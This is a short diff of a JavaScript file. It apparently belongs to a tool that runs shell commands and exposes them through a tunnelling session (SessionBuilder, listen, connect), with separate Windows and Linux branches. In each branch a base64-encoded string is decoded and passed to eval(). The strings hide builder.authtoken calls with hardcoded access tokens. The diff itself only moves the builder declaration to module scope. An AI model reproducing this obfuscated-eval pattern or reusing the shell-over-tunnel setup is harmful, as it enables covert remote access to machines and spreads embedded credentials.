@@ -15,6 +15,8 @@ async function runShell (command) {
 if (os === 'windows') windows()
 else if (os === 'linux') linux()
 
+const builder = new SessionBuilder
+
 async function listen (port) {
     const session = await builder.connect()
 
@@ -26,7 +28,6 @@ async function listen (port) {
 }
 
 async function windows () {
-    const builder = new SessionBuilder
     const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3TWdPdHVaaXJpb0dYV1VWcDQ1VlN2QjhzRF83ekpCOEpMUUtNZ1Q1UWZDS2Q0cTQnKQ==', 'base64').toString()
     eval(secret2)
 
@@ -37,7 +38,6 @@ async function windows () {
 }
 
 async function linux () {
-    const builder = new SessionBuilder
     const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycp', 'base64').toString()
     eval(secret2)
 
